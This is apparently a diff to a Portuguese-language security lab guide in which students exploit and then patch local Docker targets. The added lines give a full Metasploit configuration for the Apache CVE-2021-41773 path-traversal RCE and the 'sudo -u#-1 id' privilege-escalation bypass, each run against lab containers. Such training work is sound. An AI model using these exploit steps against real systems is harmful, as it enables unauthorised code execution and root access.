@@ -54,14 +54,20 @@ docker compose exec exploiter msfconsole -q
 Dentro do Metasploit:
 
 ```text
-search type:exploit apache
-info <modulo_escolhido>
-use <modulo_escolhido>
+use exploit/multi/http/apache_normalize_path_rce
+set CVE CVE-2021-41773
 set RHOSTS apache
 set RPORT 80
+set SSL false
+set TARGETURI /cgi-bin
+set TARGET 1
+set PAYLOAD cmd/unix/generic
+set CMD id
+set AllowNoCleanup true
 show options
 check
 run
+exit
 ```
 
 Use somente um módulo compatível com o alvo. Registre uma evidência mínima e
@@ -98,6 +104,7 @@ Dentro do container, faça a enumeração:
 id
 uname -a
 sudo --version
+sudo -u#-1 id
 sudo -l
 ```
 
@@ -109,6 +116,15 @@ sudo -l
 
 ## 6. Corrigir os três alvos
 
+
+Abra os arquivos necessários para aplicar as correções:
+
+```powershell
+notepad .\targets\apache\Dockerfile
+notepad .\targets\apache\httpd.conf
+notepad .\compose.yaml
+notepad .\targets\os-root\Dockerfile
+```
 Edite somente os arquivos do laboratório.
 
 - Apache: atualizar para uma versão corrigida e remover a configuração
@@ -143,6 +159,46 @@ Repita os testes autorizados e confirme que:
 - o acesso indevido ao MySQL não é mais aceito;
 - a elevação de privilégio no Linux não funciona mais;
 - os serviços continuam disponíveis somente nas funções necessárias.
+
+### Repetir os testes
+
+### Apache
+
+```powershell
+docker compose exec exploiter msfconsole -q
+```
+
+```text
+use exploit/multi/http/apache_normalize_path_rce
+set CVE CVE-2021-41773
+set RHOSTS apache
+set RPORT 80
+set SSL false
+set TARGETURI /cgi-bin
+set TARGET 1
+set PAYLOAD cmd/unix/generic
+set CMD id
+set AllowNoCleanup true
+check
+exit
+```
+
+### MySQL
+
+```powershell
+docker compose --profile tools run --rm mysql-check
+```
+
+### Linux/SSH
+
+```powershell
+ssh -p 2222 aluno@127.0.0.1
+```
+
+```bash
+sudo -u#-1 id
+exit
+```
 
 ## 8. Entrega
 
